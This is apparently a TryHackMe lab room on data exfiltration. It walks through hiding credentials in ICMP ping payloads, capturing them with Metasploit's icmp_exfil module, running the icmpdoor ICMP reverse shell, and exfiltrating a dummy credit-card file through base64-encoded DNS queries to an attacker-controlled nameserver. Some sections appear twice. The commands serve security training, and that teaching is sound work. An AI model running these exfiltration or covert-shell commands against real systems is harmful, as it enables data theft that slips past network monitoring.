thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin2:password2"

Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
SENT (0.0354s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=39051 seq=1] IP [ttl=64 id=32661 iplen=44 ]
RCVD (0.0358s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=63 id=18581 iplen=44 ]
RCVD (0.0748s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=31 id=2149 iplen=30 ]

Max rtt: 39.312ms | Min rtt: 0.371ms | Avg rtt: 19.841ms
Raw packets sent: 1 (44B) | Rcvd: 2 (74B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds

thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"

Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
SENT (0.0364s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=33619 seq=1] IP [ttl=64 id=51488 iplen=31 ]
RCVD (0.0369s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=63 id=19671 iplen=31 ]
RCVD (0.3760s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=31 id=1003 iplen=36 ]

Max rtt: 339.555ms | Min rtt: 0.391ms | Avg rtt: 169.973ms
Raw packets sent: 1 (31B) | Rcvd: 2 (67B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds
thm@icmp-host:~#
```

Let's check our AttackBox once we have done sending the data and the ending trigger value.

Receiving Data in MSF

```markup
msf5 auxiliary(server/icmp_exfil) > run

[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
[+] Beginning capture of "file.txt" data
[*] 30 bytes of data received in total
[+] End of File received. Saving "file.txt" to loot
[+] Incoming file "file.txt" saved to loot
[+] Loot filename: /root/.msf4/loot/20220425212408_default_ATTACKBOX_IP_icmp_exfil_838825.txt
```

Nice! We have successfully transferred data over the ICMP protocol using the Metasploit Framework. You can check the loot file mentioned in the terminal to confirm the received data.

# ICMP Communication

Next, we will show executing commands over the ICMP protocol using the [ICMPDoor](https://github.com/krabelize/icmpdoor) tool. ICMPDoor is an open-source reverse-shell written in Python3 and scapy. The
 tool uses the same concept we discussed earlier in this task, where an 
attacker utilizes the Data section within the ICMP packet. The only 
difference is that an attacker sends a command that needs to be executed
 on a victim's machine. Once the command is executed, a victim machine 
sends the execution output within the ICMP packet in the Data section.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c4c0b7beeaa41fd5b4a4f4cbe1ded82e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c4c0b7beeaa41fd5b4a4f4cbe1ded82e.png)

We have prepared the tools needed for C2 communication over the ICMP protocol on **JumpBox** and the **ICMP-Host** machines. First, we need to log in to the ICMP machine,icmp.thm.com, and execute the icmpdoor binary as follows,

Run the icmpdoor command on the ICMP-Host Machine

```markup
thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
```

Note that we specify the interface to communicate over and the destination IP of the server-side.

Next, log in to the JumpBox and execute the icmp-cnc binary to communicate with the victim, our ICMP-Host. Once
 the execution runs correctly, a communication channel is established 
over the ICMP protocol. Now we are ready to send the command that needs 
to be executed on the victim machine.

The data that needs to be transferred

```markup
thm@jump-box$  sudo icmp-cnc -i eth1 -d 192.168.0.121
shell: hostname
hostname
shell: icmp-host
```

Similar to the client-side binary, ensure to select the interface
 for the communication as well as the destination IP. As the previous 
terminal shows, we requested to execute the hostname command, and we received icmp-host.

To
 confirm that all communications go through the ICMP protocol, we 
capture the network traffic during the communication using tcpdump as 
the following:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b7df6f586e47769bf2addbee68d69cdc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b7df6f586e47769bf2addbee68d69cdc.png)

**Exfiltration using ICMP**

In this task, we will be showing how to exfiltrate data using the ICMP protocol. ICMP stands for **I**nternet **C**ontrol **M**essage **P**rotocol,
 and it is a network layer protocol used to handle error reporting. If 
you need more information about ICMP and the fundamentals of computer 
networking, you may visit the following THM room: [What is Networking](https://tryhackme.com/room/whatisnetworking).

Network devices such as routers use ICMP protocol
 to check network connectivities between devices. Note that the ICMP 
protocol is not a transport protocol to send data between devices. Let's say that two hosts need to test the connectivity in the network; then, we can use the ping command to send ICMP packets through the network, as shown in the following figure.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2a65a034de59c6e603a5a5f61fd7d909.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2a65a034de59c6e603a5a5f61fd7d909.png)

The HOST1 sends an ICMP packet with an **echo-request** packet. Then, if HOST2 is available, it sends an ICMP packet back with an **echo reply** message confirming the availability.

# ICMP Data Section

On a high level, the ICMP packet's structure contains a Data section
 that can include strings or copies of other information, such as the 
IPv4 header, used for error messages. The following diagram shows the Data section, which is optional to use.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/38e7df5e059ece4c2567bd7f77421b22.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/38e7df5e059ece4c2567bd7f77421b22.png)

Note that the Data field is optional and could either be empty or it could contain a random string during the communications. As an attacker, we can use the ICMP structure to include our data within the Data section and send it via ICMP packet to another machine. The other machine must capture the network traffic with the ICMP packets to receive the data.

To perform manual ICMP data exfiltration, we need to discuss the ping command a bit more. The ping command is a network administrator software available in any operating system. It is used to check the reachability and availability by sending ICMP packets, which can be used as follows:

Sending one ICMP packet using the PING Command

```markup
thm@AttackBox$ ping MACHINE_IP -c 1
```

We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the-c 1 argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3e8367a535e3f7f4076986987b9e0dcd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3e8367a535e3f7f4076986987b9e0dcd.png)

The Wireshark screenshot shows that the Data section has been 
selected with random strings. It is important to note that this section 
could be filled with the data that needs to be transferred to another 
machine.

The ping command in the Linux OS has an interesting ICMP option. With the -p argument, we can specify 16 bytes of data in hex representation to send through the packet. Note that the -p option is only available for Linux operating systems. We can confirm that by checking the ping's help manual page.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/61d50ec683ddae6c2f52f532cc02f685.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/61d50ec683ddae6c2f52f532cc02f685.png)

Let's say that we need to exfiltrate the following credentials thm:tryhackme. First, we need to convert it to its Hex representation and then pass it to the ping command using -p options as follows,

Using the xxd command to convert text to Hex

```markup
root@AttackBox$ echo "thm:tryhackme" | xxd -p
74686d3a7472796861636b6d650a
```

We used the xxd command to convert our string to Hex, and then we can use the ping command with the Hex value we got from converting the thm:tryhackme.

Send Hex using the ping command.

```markup
root@AttackBox$ ping MACHINE_IP -c 1 -p 74686d3a7472796861636b6d650a
```

We sent one ICMP packet using the ping command with thm:tryhackme Data. Let's look at the Data section for this packet in the Wireshark.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6a086470f770c67c0a07f9572088e5e1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/6a086470f770c67c0a07f9572088e5e1.png)

Excellent! We have successfully filled the ICMP's Data section with our data and manually sent it over the network using the ping command.

# ICMP Data Exfiltration

Now that we have the basic fundamentals of manually sending data over ICMP packets, let's discuss how to use Metasploit
 to exfiltrate data. The Metasploit framework uses the same technique 
explained in the previous section. However, it will capture incoming 
ICMP packets and wait for a Beginning of File (BOF) trigger value. Once 
it is received, it writes to the disk until it gets an End of File (EOF)
 trigger value. The following diagram shows the required steps for the 
Metasploit framework. Since we need the Metasploit Framework for this 
technique, then we need the AttackBox machine to perform this attack 
successfully.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b45715c44b5998fa9bf6a989b1e0d8d6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b45715c44b5998fa9bf6a989b1e0d8d6.png)

Now from the **AttackBox**, let's set up the Metasploit framework by selecting the icmp_exfil module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the BPF_FILTER option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as follows,

Set the BPF_FILTER in MSF

```markup
msf5 > use auxiliary/server/icmp_exfil
msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP
BPF_FILTER => icmp and not src ATTACKBOX_IP
```

We also need to select which network interface to listen to, eth0. Finally, executes run to start the module.

Set the interface in MSF

```markup
msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
INTERFACE => eth0
msf5 auxiliary(server/icmp_exfil) > run

[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
```

We prepared icmp.thm.com as a victim machine to complete the ICMP task with the required tools. From the JumpBox, log in to the icmp.thm.com using thm:tryhackme credentials.

We have preinstalled the [nping](https://nmap.org/nping/)
 tool, an open-source tool for network packet generation, response 
analysis, and response time measurement. The NPING tool is part of the 
NMAP suite tools.

First, we will send the BOF trigger from the ICMP machine so that the Metasploit framework starts writing to the disk.

Sending the Trigger Value from the Victim

```markup
thm@jump-box$ ssh thm@icmp.thm.com
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"

Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
SENT (0.0369s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=7785 seq=1] IP [ttl=64 id=40595 iplen=39 ]
RCVD (0.0376s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=63 id=12656 iplen=39 ]
RCVD (0.0755s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=31 id=60759 iplen=32 ]

Max rtt: 38.577ms | Min rtt: 0.636ms | Avg rtt: 19.606ms
Raw packets sent: 1 (39B) | Rcvd: 2 (71B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds
```

We sent one ICMP packet using the nping command with --data-string argument. We specify the trigger value with the file name BOFfile.txt, set by default in the Metasploit framework. This could be changed from Metasploit if needed!

Now check the AttackBox terminal. If everything is set correctly, the Metasploit framework should identify the trigger value and wait for the data to be written to disk.

Let's start sending the required data and the end of the file trigger value from the ICMP machine.

Sending the Data and the End of the File Trigger Value

```markup
thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"

Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
SENT (0.0312s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=14633 seq=1] IP [ttl=64 id=13497 iplen=42 ]
RCVD (0.0328s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=63 id=17031 iplen=42 ]
RCVD (0.0703s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=31 id=41138 iplen=30 ]

Max rtt: 39.127ms | Min rtt: 1.589ms | Avg rtt: 20.358ms
Raw packets sent: 1 (42B) | Rcvd: 2 (72B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.06 seconds

thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin2:password2"

Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
SENT (0.0354s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=39051 seq=1] IP [ttl=64 id=32661 iplen=44 ]
RCVD (0.0358s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=63 id=18581 iplen=44 ]
RCVD (0.0748s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=31 id=2149 iplen=30 ]

Max rtt: 39.312ms | Min rtt: 0.371ms | Avg rtt: 19.841ms
Raw packets sent: 1 (44B) | Rcvd: 2 (74B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds

thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"

Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
SENT (0.0364s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=33619 seq=1] IP [ttl=64 id=51488 iplen=31 ]
RCVD (0.0369s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=63 id=19671 iplen=31 ]
RCVD (0.3760s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=31 id=1003 iplen=36 ]

Max rtt: 339.555ms | Min rtt: 0.391ms | Avg rtt: 169.973ms
Raw packets sent: 1 (31B) | Rcvd: 2 (67B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds
thm@icmp-host:~#
```

Let's check our AttackBox once we have done sending the data and the ending trigger value.

Receiving Data in MSF

```markup
msf5 auxiliary(server/icmp_exfil) > run

[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
[+] Beginning capture of "file.txt" data
[*] 30 bytes of data received in total
[+] End of File received. Saving "file.txt" to loot
[+] Incoming file "file.txt" saved to loot
[+] Loot filename: /root/.msf4/loot/20220425212408_default_ATTACKBOX_IP_icmp_exfil_838825.txt
```

Nice! We have successfully transferred data over the ICMP protocol using the Metasploit Framework. You can check the loot file mentioned in the terminal to confirm the received data.

# ICMP Communication

Next, we will show executing commands over the ICMP protocol using the [ICMPDoor](https://github.com/krabelize/icmpdoor) tool. ICMPDoor is an open-source reverse-shell written in Python3 and scapy. The
 tool uses the same concept we discussed earlier in this task, where an 
attacker utilizes the Data section within the ICMP packet. The only 
difference is that an attacker sends a command that needs to be executed
 on a victim's machine. Once the command is executed, a victim machine 
sends the execution output within the ICMP packet in the Data section.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c4c0b7beeaa41fd5b4a4f4cbe1ded82e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c4c0b7beeaa41fd5b4a4f4cbe1ded82e.png)

We have prepared the tools needed for C2 communication over the ICMP protocol on **JumpBox** and the **ICMP-Host** machines. First, we need to log in to the ICMP machine,icmp.thm.com, and execute the icmpdoor binary as follows,

Run the icmpdoor command on the ICMP-Host Machine

```markup
thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
```

Note that we specify the interface to communicate over and the destination IP of the server-side.

Next, log in to the JumpBox and execute the icmp-cnc binary to communicate with the victim, our ICMP-Host. Once
 the execution runs correctly, a communication channel is established 
over the ICMP protocol. Now we are ready to send the command that needs 
to be executed on the victim machine.

The data that needs to be transferred

```markup
thm@jump-box$  sudo icmp-cnc -i eth1 -d 192.168.0.121
shell: hostname
hostname
shell: icmp-host
```

Similar to the client-side binary, ensure to select the interface
 for the communication as well as the destination IP. As the previous 
terminal shows, we requested to execute the hostname command, and we received icmp-host.

To
 confirm that all communications go through the ICMP protocol, we 
capture the network traffic during the communication using tcpdump as 
the following:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b7df6f586e47769bf2addbee68d69cdc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b7df6f586e47769bf2addbee68d69cdc.png)

**DNS Configurations**

# DNS

To perform exfiltration via the DNS
 protocol, you need to control a domain name and set up DNS records, 
including NS, A, or TXT. Thus, we provide a web interface to make it 
easy for you to add and modify the DNS records. The following domain 
name is set up and ready for the DNS exfiltration task: tunnel.com.

To access the website, you may visit the following link: http://MACHINE_IP/ or https://LAB_WEB_URL.p.thmlabs.com/ without the need for a VPN.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b8b4c25e0eb4dd04f1aea8596bf9319e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b8b4c25e0eb4dd04f1aea8596bf9319e.png)

Once you choose the domain name, you can add DNS records and test and reset the DNS configuration if something goes wrong.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/af468d0202712ac1890f5dacb135e532.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/af468d0202712ac1890f5dacb135e532.png)

# New Attacker Machine

Note that we have added a new Attacker machine in Network 2, which has the following subdomain name and IP address:

| **Domain Name** | **IP Address** | **Network Access** |
| --- | --- | --- |
| attacker.thm.com | 172.20.0.200 | Network 2 |

We will be using the Attacker machine to exfiltrate in DNS
 and DNS tunneling scenarios. The main goal is that the Attacker machine
 (on Network2) can access internal network devices of Network 1 through 
JumpBox.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e6bf2c81281be5cf8515eeed22254643.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e6bf2c81281be5cf8515eeed22254643.png)

# Nameserver for Exfiltration

To successfully execute DNS
 exfiltration within the provided network or on the Internet, we need to
 set up a name server for the domain name we control as the following:

1. Add an **A** record that points to the AttackBox's IP address. For example, Type: **A**, Subdomain Name: **t1ns**, Value: **AttackBox_IP**.
2. Add an **NS** record that routes DNS queries to the **A** records in **step 1**. For example, Type: NS, Subdomain Name: t1, Value: t1ns.tunnel.com.

Ensure that for the NS value we specify the full domain name: t1ns.tunnel.com. Once the two records are added, the name server t1.tunnel.com is ready to be used for DNS Exfiltration purposes.

If
 you choose not to set up your AttackBox, we set up a nameserver for the
 Attacker machine within our provided network, and it is ready to use as
 follows,

| **DNS Record** | **Type** | **Value** |
| --- | --- | --- |
| attNS.tunnel.com | A | 172.20.0.200 |
| att.tunnel.com | NS | attNS.tunnel.com |

Note that the attNS.thm.com IP address points to the newly added attacker machine in our network and it is ready to be used in our environment between the JumpBox and Attacker for DNS tasks and purposes.

# Lab Recommendation

Even though you can use the AttackBox for this room, we recommend using the **JumpBox** for most parts (TCP,
 SSH, ICMP, DNS) to avoid technical issues with DNS and networking. If 
you prefer to use the AttackBox for the DNS Tunneling task (task 10), 
you must change the DNS settings of the AttackBox to MACHINE_IP. There are many ways to change the DNS settings in the AttackBox machine. However, the following is one of the stable solutions we found for our environment.

First, we need to edit the Yaml Netplan configuration file.

Edit Netplan Configuration File

```markup
root@AttackBox:~# nano /etc/netplan/aws-vmimport-netplan.yaml
```

Modify the Netplan configuration file and add the **nameserver** section under the **eth0** interface to be as the following:

```markup
# Automatically generated by the vm import process
 network:
     ethernets:
         eth0:
             dhcp4: true
             optional: false
             nameservers:
                search: [tunnel.com]
                addresses: [MACHINE_IP]
         ens5:
             dhcp4: true
             optional: false
     version: 2
```

Finally, apply the Netplan Changes (This may need to be run twice).

Apply the Netplan Changes

```markup
root@AttackBox:~# netplan apply
```

# DNS

Once you have access to the Jump machine, you need to make sure that the DNS is working correctly by testing it as follows:

Testing the DNS configuration

```markup
thm@jump-box:~$ dig +short test.thm.com
127.0.0.1
thm@jump-box:~$ ping test.thm.com -c 1
PING test.thm.com (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.018 ms

--- test.thm.com ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.018/0.018/0.018/0.000 ms
```

The DNS server must resolve the test.thm.com and test.tunnel.com domain names to 127.0.0.1, confirming that you're ready.

**Exfiltration over DNS**

The DNS
 protocol is a common protocol and Its primary purpose is to resolve 
domain names to IP addresses and vice versa. Even though the DNS 
protocol is not designed to transfer data, threat actors found a way to 
abuse and move data over it. This task shows a technique to exfiltrate data over the DNS protocol.

# What is Data Exfiltration?

Since

DNS

is not a transport protocol, many organizations don't regularly monitor
 the DNS protocol! The DNS protocol is allowed in almost all firewalls 
in any organization network. For those reasons, threat actors prefer 
using the DNS protocol to hide their communications.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8bbc858294e45de16712024af22181fc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/8bbc858294e45de16712024af22181fc.png)

The DNS protocol has limitations that need to be taken into consideration, which are as follows,

- The maximum length of the Fully Qualified FQDN domain name (including .separators) is 255 characters.
- The subdomain name (label) length must not exceed 63 characters (not including .com, .net, etc).

Based on these limitations, we can use a limited number of characters 
to transfer data over the domain name. If we have a large file, 10 MB 
for example, it may need more than 50000 DNS requests to transfer the file completely. Therefore, it will be noisy traffic and easy to notice and detect.

Now let's discuss the Data Exfiltration over DNS requirements and steps, which are as follows:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9881e420044ca01239d34c858342b888.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9881e420044ca01239d34c858342b888.png)

1. An attacker registers a domain name, for example, **tunnel.com**
2. The attacker sets up tunnel.com's NS record points to a server that the attacker controls.
3. The malware or the attacker sends sensitive data from a victim machine to a domain name they control—for example, passw0rd.tunnel.com, where **passw0rd** is the data that needs to be transferred.
4. The DNS request is sent through the local DNS server and is forwarded through the Internet.
5. The attacker's authoritative DNS (malicious server) receives the DNS request.
6. Finally, the attacker extracts the password from the domain name.

# When do we need to use the Data Exfiltration?

There
 are many use case scenarios, but the typical one is when the firewall 
blocks and filters all traffic. We can pass data or TCP/UDP packets 
through a firewall using the DNS protocol, but it is important to ensure that the DNS is allowed and resolving domain names to IP addresses.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e881336d12bd5f24d2167730adda0adc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e881336d12bd5f24d2167730adda0adc.png)

# Modifying the Records!

Now let's try to perform a DNS Data Exfiltration in the provided network environment. Note we will be using the **tunnel.com** domain name in this scenario. We also provide a web interface to modify the DNS records of tunnel.com to insert a Name Server (NS) that points to your AttackBox machine. Ensure to complete these settings in task 8.

# DNS

Now let's explain the manual

DNS

Data Exfiltration technique and show how it works. Assume that we have a creds.txt file with sensitive data, such as credit card information. To move it over the

DNS

protocol, we need to encode the content of the file and attach it as a subdomain name as follows,

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a7ac15da0501d577dadcf53b4143ff98.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/a7ac15da0501d577dadcf53b4143ff98.png)

1. Get the required data that needs to be transferred.
2. Encode the file using one of the encoding techniques.
3. Send the encoded characters as subdomain/labels.
4. Consider the limitations of the DNS protocol. Note that we can add as much data as we can to the domain
name, but we must keep the whole URL under 255 characters, and each
subdomain label can't exceed 63 characters. If we do exceed these
limits, we split the data and send more DNS requests!

Now let's try to perform the DNS Data Exfiltration technique in the provided network environment. This section aims to transfer the content of the creds.txt file from victim2 to attacker. We will use the att.tunnel.com nameserver, pointing to the newly added machine (the attacker machine).

Important: You can use the AttackBox for this task but ensure to update the DNS records and add an NS record that points to your AttackBox's IP address or use the preconfigured nameserver att.tunnel.com for the attacker machine.

The first thing to do is make the attacker machine ready to receive any DNS request. Let's connect to the attacker machine through SSH, which could be done from the Jump Box using the following credentials: thm:tryhackme.

Connect to the Attacker machine via SSH Client from JumpBox

```markup
thm@jump-box$ ssh thm@attacker.thm.com
```

Or from the AttackBox machine using the MACHINE_IP and port 2322 as follows,

Connect to the Attacker machine via SSH Client from AttackBox

```markup
root@AttackBox$ ssh thm@MACHINE_IP -p 2322
```

In order to receive any DNS request, we need to capture the network traffic for any incoming UDP/53 packets using the tcpdump tool.

Capturing DNS requests on the Attacker Machine

```markup
thm@attacker$ sudo tcpdump -i eth0 udp port 53 -v
tcpdump: listening on eth0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Once the attacker machine is ready, we can move to the next step which is to connect to our victim2 through SSH, which could be done from the Jump Box using the following credentials: thm:tryhackme.

Connect to Victim 2 via SSH Client from JumpBox

```markup
thm@jump-box$ ssh thm@victim2.thm.com
```

Or from the AttackBox machine using the MACHINE_IP and port 2122 as follows,

Connect to Victim 2 via SSH Client from AttackBox

```markup
root@AttackBox$ ssh thm@MACHINE_IP -p 2122
```

On the victim2 machine, there is a task9/credit.txt file with dummy data.

Checking the content of the creds.txt file

```markup
thm@victim2$ cat task9/credit.txt
Name: THM-user
Address: 1234 Internet, THM
Credit Card: 1234-1234-1234-1234
Expire: 05/05/2022
Code: 1337
```

In order to send the content of a file, 
we need to convert it into a string representation which could be done 
using any encoding representation such as Base64, Hex, Binary, etc. In 
our case, we encode the file using Base64 as follows,

Encoding the Content of the credit.txt File

```markup
thm@victim2$ cat task9/credit.txt | base64
TmFtZTogVEhNLXVzZXIKQWRkcmVzczogMTIzNCBJbnRlcm5ldCwgVEhNCkNyZWRpdCBDYXJkOiAx
MjM0LTEyMzQtMTIzNC0xMjM0CkV4cGlyZTogMDUvMDUvMjAyMgpDb2RlOiAxMzM3Cg==
```

Now that we have the Base64 representation, we need to split it into one or multiple DNS
 requests depending on the output's length (DNS limitations) and attach 
it as a subdomain name. Let's show both ways starting with splitting for
 multiple DNS requests.

Splitting the content into multiple DNS requests

```markup
thm@victim2:~$ cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/'
TmFtZTogVEhNLXVzZX.att.tunnel.com
IKQWRkcmVzczogMTIz.att.tunnel.com
NCBJbnRlcm5ldCwgVE.att.tunnel.com
hNCkNyZWRpdCBDYXJk.att.tunnel.com
OiAxMjM0LTEyMzQtMT.att.tunnel.com
IzNC0xMjM0CkV4cGly.att.tunnel.com
ZTogMDUvMDUvMjAyMg.att.tunnel.com
pDb2RlOiAxMzM3Cg==.att.tunnel.com
```

In the previous command, we read the file's content and encoded it 
using Base64. Then, we cleaned the string by removing the new lines and 
gathered every 18 characters as a group. Finally, we appended the name 
server "att.tunnel.com" for every group.

Let's check the other way where we send a single DNS request, which we will be using for our data exfiltration. This time, we split every 18 characters with a dot "." and add the name server similar to what we did in the previous command.

Splitting the content into a single DNS request

```markup
thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/
TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com
```

Next, from the victim2 machine, we send the base64 data as a subdomain name with considering the DNS limitation as follows:

Send the Encoded data via the dig command

```markup
thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
```

With some adjustments to the single DNS
 request, we created and added the dig command to send it over the DNS, 
and finally, we passed it to the bash to be executed. If we check the 
Attacker's tcpdump terminal, we should receive the data we sent from victim2.

Receiving the Data Using tcpdump

```markup
thm@attacker:~$ sudo tcpdump -i eth0 udp port 53 -v
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
22:14:00.287440 IP (tos 0x0, ttl 64, id 60579, offset 0, flags [none], proto UDP (17), length 104)
    172.20.0.1.56092 > attacker.domain: 19543% [1au] A? _.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (76)
22:14:00.288208 IP (tos 0x0, ttl 64, id 60580, offset 0, flags [none], proto UDP (17), length 235)
